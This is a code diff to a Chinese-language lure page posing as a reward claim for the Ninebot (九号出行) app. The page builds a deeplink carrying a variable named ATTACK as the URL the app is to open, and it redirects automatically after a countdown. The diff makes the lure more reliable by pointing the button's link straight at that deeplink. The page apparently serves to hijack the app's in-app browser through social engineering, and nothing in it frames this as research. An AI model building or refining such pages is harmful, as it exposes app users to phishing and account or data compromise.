@@ -58,7 +58,7 @@
     <div class="bar"><i></i></div>
   </div>
 
-  <button class="cta" id="go">立即打开 App 领取</button>
+  <a class="cta" id="go" href="#" style="display:block;text-align:center;text-decoration:none;color:#1c1400;padding:17px 0;font-size:18px;font-weight:800;letter-spacing:2px;background:linear-gradient(135deg,#ffc043,#ff8a00);border-radius:16px;box-shadow:0 10px 28px rgba(255,138,0,.35);animation:pulse 2.2s infinite">立即打开 App 领取</a>
   <div class="sub">点击后将自动跳转 <b>九号出行 App</b> 完成核验<br>未安装？<a href="javascript:void(0)" id="retry">重试跳转</a> 或前往应用商店搜索「九号出行」</div>
   <div id="countdown" style="text-align:center;margin-top:16px;font-size:15px;color:#ffb340;font-weight:700"></div>
   <div id="jumplog"></div>
@@ -70,13 +70,14 @@
            encodeURIComponent(JSON.stringify({url: ATTACK}));
   var log = document.getElementById("jumplog");
   var cd = document.getElementById("countdown");
+  // <a> href 直接指向deeplink (welfare-entry同款, 浏览器scheme识别更可靠)
+  document.getElementById("go").href = DL;
   function jump(tag){
     cd.innerHTML = "🚀 正在跳转九号App…";
     cd.style.fontSize = "18px";
     log.textContent = "[deeplink " + tag + "] " + DL.substring(0, 60) + "…";
     location.href = DL;
   }
-  document.getElementById("go").addEventListener("click", function(){ jump("btn"); });
   document.getElementById("retry").addEventListener("click", function(){ jump("retry"); });
   // 倒计时3秒后自动跳转
   var n = 3;
